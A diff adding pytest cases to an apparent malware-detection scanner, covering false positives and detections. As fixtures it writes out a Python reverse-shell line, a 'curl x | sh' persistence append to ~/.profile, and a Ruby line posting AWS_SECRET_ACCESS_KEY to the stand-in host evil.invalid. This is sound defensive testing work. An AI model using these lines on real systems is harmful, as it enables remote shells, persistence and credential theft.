@@ -288,3 +288,41 @@ def test_still_flagged_after_the_held_out_tuning(tmp_path: Path) -> None:
     assert got["pipe-to-shell"] == "CRITICAL" and got["cryptominer"] == "HIGH"
     assert got["npm-lifecycle-script"] == "HIGH" and got["typosquat?"] == "HIGH"
     assert got.get("b64-exec") == "CRITICAL" or got["py-exec-compile"] in ("HIGH", "CRITICAL")
+
+
+def test_fresh_validation_false_positives_stay_quiet(tmp_path: Path) -> None:
+    """Found on a second, unseen set (click, pytest, ripgrep, django, vue): stream redirection is no shell."""
+    write(
+        tmp_path, "cap.py", "os.dup2(self._tmpfile.fileno(), self._targetfd)\nos.dup2(devnull, sys.stdout.fileno())\n"
+    )
+    write(tmp_path, "types.rs", '    "login", ".logout", ".profile", "profile",\n')
+    write(tmp_path, "t.py", "self.assertEqual(person.profile, other)\n")
+    write(
+        tmp_path,
+        "package.json",
+        json.dumps({"scripts": {"preinstall": "npx only-allow pnpm"}, "dependencies": {"enquirer": "2"}}),
+    )
+    assert scan(tmp_path) & {"reverse-shell", "persistence", "npm-lifecycle-script", "typosquat?"} == set()
+
+
+def test_real_reverse_shell_and_rc_edits_still_fire(tmp_path: Path) -> None:
+    write(tmp_path, "rs.py", "s=socket.socket(); s.connect((h,4444)); os.dup2(s.fileno(),0); pty.spawn('/bin/sh')\n")
+    write(tmp_path, "p.sh", "echo 'curl x | sh' >> ~/.profile\necho y >> $HOME/.profile\n")
+    got = scan(tmp_path)
+    assert {"reverse-shell", "persistence"} <= got
+
+
+def test_stealer_capabilities_seen_in_third_party_samples(tmp_path: Path) -> None:
+    """Gaps found with experiments/guarddog_recall.py (GuardDog's own rule-test samples)."""
+    write(tmp_path, "clip.py", "data = pyperclip.paste()\n")
+    write(tmp_path, "shot.py", "img = ImageGrab.grab()\n")
+    write(tmp_path, "dump.js", "const e = JSON.stringify(process.env);\n")
+    write(tmp_path, "r.rb", "HTTParty.post(\"https://evil.invalid\", body: ENV['AWS_SECRET_ACCESS_KEY'])\n")
+    write(tmp_path, "ok.py", "x = 1  # nothing to see\n")
+    got = {f["file"]: f["rule"] for f in findings(tmp_path)}
+    assert got == {
+        "clip.py": "clipboard-read",
+        "shot.py": "screen-capture",
+        "dump.js": "env-dump",
+        "r.rb": "env-secret-send",
+    }
